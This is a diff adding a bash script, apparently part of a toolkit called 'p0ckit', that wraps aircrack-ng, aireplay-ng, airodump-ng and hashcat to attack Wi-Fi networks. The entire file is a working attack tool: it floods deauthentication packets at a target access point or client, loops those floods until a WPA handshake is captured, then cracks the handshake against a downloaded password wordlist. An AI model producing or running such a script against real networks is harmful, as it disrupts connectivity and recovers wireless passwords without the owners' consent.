@@ -1,0 +1,196 @@
+#!/bin/bash
+#str_op
+#	iface - required
+#	type - required (set the type of the scan you want: recon, deauth, hand_cap)
+#	bssid - required (for all types besides recon)
+#	count - optional (set the number deauth pkg sent, default is until stoped)
+#	client - optional (set a specific client for deauth)
+#	channel - required (set the channel of AP (required cause sometimes aireplay-ng doesn't get the right channel))
+#end_op
+#str_info
+#	This is a aircrack-ng wrapper made in bash to ease wifi attacks
+#end_info
+
+ch=$channel
+wd_path="wordlists"
+d_wl="$wd_path/p0ckit_wd.txt"
+
+duth_attk() {
+	mon_md
+	duth
+}
+
+duth() {
+	if [[ -z $client && -z $count ]]; then
+		sudo aireplay-ng --deauth 0 -a $bssid $ifacemon
+	elif [[ -n $client && -z $count ]]; then
+		sudo aireplay-ng --deauth 0 -a $bssid -c $client $ifacemon
+	elif [[ -n $client && -n $count ]]; then
+		sudo aireplay-ng --deauth $count -a $bssid -c $client $ifacemon
+	elif [[ -z $client && -n $count ]]; then
+		sudo aireplay-ng --deauth $count -a $bssid $ifacemon
+	fi
+	
+	
+}
+
+hcat_mk() {
+	local cf=$1
+	if [[ -z $cf ]]; then
+		echo "[!] No cap file found!"
+		return 1
+	fi
+	hc_out="${cf%.cap}-out.hc22000"
+	hcxpcapngtool -o $hc_out $cf
+
+}
+
+crk_cap() {
+	local op=$1
+	local wl=$2
+	if [[ -z $wl ]]; then
+		echo "[!] No wordlist specified using default"
+		if wdl_dow; then
+			s_wl=$d_wl
+		else
+			echo "[!] Couldn't use default worlist"
+		fi
+	elif [[ $wl ]]; then
+		echo "[!] Using selected wordlist: $wl"
+		s_wl=$wl
+	fi
+	if [[ "$op" == 1 ]]; then
+		aircrack-ng .cap-files/$capf -w $s_wl;
+	elif [[ "$op" == 2 ]]; then
+		if hcat_mk .cap-files/$capf; then
+			hashcat -m 22000 "$hc_out" "$s_wl" --potfile-disable
+		fi
+		
+	fi
+
+}
+
+cap_renm() {
+	local cap=$1
+	if [[ ! -d .cap-files ]]; then
+		mkdir -p .cap-files
+	fi
+	if [[ -z $bssid ]]; then
+		capf=p0ckit-${ts}.cap
+		mv $cap .cap-files/$capf
+	else
+		capf=p0ckit-${bssid}-${ts}.cap
+		mv $cap .cap-files/$capf
+	fi
+}
+
+wdl_dow() {
+	local ans
+	if [[ ! -f $d_wl ]]; then
+		echo "[!] Default wordlist is not found!"
+		echo "[?] Do you want to download it?(y/N)"
+		read -p "=>" ans
+		ans=${ans:-n}
+		ans=${ans,,}
+		if [[ "$ans" = y ]]; then
+			echo "[+] Downloading the wordlist..."
+			if [[ ! -d $wd_path ]]; then
+				mkdir -p $wd_path
+			fi
+			curl -L https://crackstation.net/files/crackstation-human-only.txt.gz -o ${wd_path}/temp.gz
+			gunzip -c ${wd_path}/temp.gz > $d_wl
+			echo "[+] Download completed!"
+			return 0
+		else 
+			echo "How you say"
+			return 1
+		fi
+	else
+		return 0
+	fi
+	
+}
+
+cap_attk() {
+	local ans
+	trap 'echo "[!] Handshake capture stopped!"; sudo pkill airodump-ng; trap - INT; return' INT
+	[[ -z $count ]] && count=10
+	mon_md
+	sudo airodump-ng $ifacemon --bssid $bssid --channel $ch -w capture --output-format pcap > /dev/null 2>&1 &
+	while true; do
+		duth
+		sleep 7
+		if aircrack-ng -w /dev/null capture-01.cap 2>&1 | grep -oP "1 handshake"; then
+			echo "[+] Handshake captured"
+			sudo pkill airodump-ng
+			break
+		else
+			sudo rm capture-01.cap
+		fi
+		sleep 2
+	done
+	ts=$(date +"%Y%m%d_%H%M%S")
+	cap_renm capture-01.cap
+	echo "[?] Do you want to crack it?(y/N)"
+	read -p "=>" ans
+	ans=${ans:-n}
+	ans=${ans,,}
+	if [[ "$ans" = y ]]; then
+		local ans
+		echo "[?] What do you want to use?"
+		echo "[?] 1. aircrack-ng 2. hashcat"
+		read -p "=>" ans
+		ans=${ans:-1}
+		ans=${ans,,}
+		if [[ "$ans" = 2 ]]; then
+			crk_cap 2
+		elif [[ "$ans" = 1 ]]; then
+			crk_cap 1
+		fi
+	else
+		echo "[+] Ok as you say."
+	fi
+	trap - INT
+}
+
+rec_attk() {
+	mon_md
+	sudo airodump-ng $ifacemon --manufacturer
+}
+
+mon_md() {
+	mod=$(iwconfig $iface | grep -oP "Mode:\K\S+")
+	if [[ $mod != "Monitor" ]]; then
+		echo "${0}: interface not in monitor mode"
+		echo "${0}: setting interface in monitor mode..."
+		if sudo airmon-ng start $iface > /dev/null 2>&1; then
+			ifacemon=${iface}mon
+		fi
+	else
+		echo "${0}: interface already in monitor mode"
+		echo "${0}: continuing..."
+		ifacemon=$iface
+	fi
+	
+}
+
+
+attk_type() {
+	case "$type" in
+		recon) rec_attk ;;
+		deauth) duth_attk ;;
+		handcap|hand_cap|hand-cap) cap_attk ;;
+		crack) crk_cap ;;
+	esac
+
+}
+
+if [[ -z $iface ]]; then
+	echo "${0}: interface not set, please set one using set iface <interface>"
+else
+	if iwconfig $iface > /dev/null 2>&1; then
+		attk_type
+	else
+		echo "${0}: interface is set but unavailable or it isn't connected"
+	fi
+fi
